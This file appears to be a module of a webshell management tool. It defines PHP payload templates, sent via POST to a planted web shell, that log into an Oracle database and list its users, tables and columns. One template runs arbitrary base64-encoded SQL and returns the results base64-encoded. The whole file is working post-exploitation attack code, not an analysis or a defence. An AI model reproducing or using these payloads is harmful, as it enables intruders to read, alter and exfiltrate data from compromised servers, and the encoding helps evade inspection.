/**
 * 数据库管理模板::oracle
 * i 数据分隔符号 => \t|\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _:
      `$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$H=@Ora_Logon("\${usr}/\${pwd}@\${sid}","");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"SELECT USERNAME FROM ALL_USERS ORDER BY 1");if(ora_exec($T)){while(ora_fetch($T)){echo(trim(ora_getcolumn($T,0)).chr(9));}}@ora_close($T);};`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}'
  },
  // 显示数据库所有表
  show_tables: {
    _:
      `$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"SELECT TABLE_NAME FROM (SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{$dbn}' ORDER BY 1)");if(ora_exec($T)){while(ora_fetch($T)){echo(trim(ora_getcolumn($T,0)).chr(9));}}@ora_close($T);};`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}'
  },
  // 显示表字段
  show_columns: {
    _:
      `$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$tab=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"SELECT COLUMN_NAME,DATA_TYPE FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{$tab}' ORDER BY COLUMN_ID");if(ora_exec($T)){while(ora_fetch($T)){echo(trim(ora_getcolumn($T,0))." (".ora_getcolumn($T,1).")".chr(9));}}@ora_close($T);};`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{table}'
  },
  // 执行SQL语句
  query: {
    _:
      `$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"{$sql}");$R=ora_exec($T);if($R){$n=ora_numcols($T);for($i=0;$i<$n;$i++){echo(Ora_ColumnName($T,$i)."\t|\t");}echo("\r\n");while(ora_fetch($T)){for($i=0;$i<$n;$i++){echo(base64_encode(trim(ora_getcolumn($T,$i))));echo("\t|\t");}echo("\r\n");}}else{echo("ErrMsg\t|\t\r\n");}@ora_close($T);};`,
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{base64::sql}'
  }
})
